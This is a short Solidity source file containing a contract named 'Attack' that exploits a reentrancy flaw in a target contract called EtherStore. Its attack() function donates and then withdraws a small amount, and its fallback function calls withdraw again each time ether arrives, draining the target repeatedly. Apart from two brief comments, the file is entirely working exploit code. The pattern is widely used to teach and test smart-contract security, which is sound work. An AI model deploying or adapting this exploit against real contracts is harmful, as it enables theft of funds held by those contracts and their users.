// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
interface EtherStore {
    function withdraw(uint) external;
    function donate(address) payable external;
}


contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
            etherStore.withdraw(0.01 ether);
    }

    function attack() external payable {
        etherStore.donate{value: 0.01 ether}(address(this));
        etherStore.withdraw(0.01 ether);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}